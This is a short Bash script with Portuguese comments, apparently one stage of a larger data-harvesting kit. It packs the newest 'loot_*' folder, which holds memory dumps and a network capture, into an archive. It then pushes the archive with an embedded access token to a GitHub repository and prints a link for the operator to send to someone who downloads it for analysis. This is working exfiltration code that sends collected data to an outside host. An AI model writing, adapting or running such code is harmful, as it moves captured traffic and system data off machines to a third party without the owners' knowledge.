#!/bin/bash
# UPLOAD.sh - empacota a ultima pasta loot_* e da push pro GitHub.
# Depois tu me manda o link do commit e eu baixo pra analisar.
cd "$(dirname "$(readlink -f "$0")")"
source ./config.sh

if [ "$GITHUB_USER" = "SEU_USUARIO_AQUI" ]; then
  echo "[!] Edita config.sh primeiro"; read -p "Enter..."; exit 1
fi

LAST=$(ls -td loot_* 2>/dev/null | head -1)
if [ -z "$LAST" ]; then
  echo "[!] Nenhuma pasta loot_* encontrada. Roda RODAR.sh ou RESET.sh primeiro."
  read -p "Enter..."; exit 1
fi

echo "[*] Empacotando $LAST..."
TAR="results_$(date +%Y%m%d_%H%M%S).tar.gz"
# limita dumps gigantes pra 50MB cada senao estora limite github
tar -czf "$TAR" \
  --exclude='*.pcap' \
  --exclude='full_*.dmp' \
  "$LAST"
SIZE=$(du -h "$TAR" | cut -f1)
echo "    $TAR = $SIZE"

# limite github sem LFS = 100MB por arquivo, 2GB repo
# se o tar for > 90MB, separa pcap em arquivo propio
if [ -f "$LAST/net/capture.pcap" ]; then
  PCAP_SIZE=$(stat -c%s "$LAST/net/capture.pcap")
  if [ $PCAP_SIZE -lt 90000000 ]; then
    cp "$LAST/net/capture.pcap" "./capture_$(date +%Y%m%d_%H%M%S).pcap"
  fi
fi

git config --global user.name "$GIT_NAME"
git config --global user.email "$GIT_EMAIL"
git config --global --add safe.directory "$(pwd)"

REMOTE="https://${GITHUB_TOKEN}@github.com/${GITHUB_USER}/${GITHUB_REPO}.git"
git remote set-url origin "$REMOTE" 2>/dev/null || git remote add origin "$REMOTE"

echo "[*] Dando push dos resultados..."
git add results_*.tar.gz capture_*.pcap 2>/dev/null
git commit -m "loot $(date -Iseconds)" 2>&1 | tail -5
git push origin main 2>&1 | tail -10

if [ $? -eq 0 ]; then
  URL="https://github.com/${GITHUB_USER}/${GITHUB_REPO}/commits/main"
  echo ""
  echo "============================================================"
  echo "   OK - resultado no GitHub"
  echo "   Manda esse link pra ele:"
  echo "   $URL"
  echo "============================================================"
fi
read -p "Enter pra fechar..."
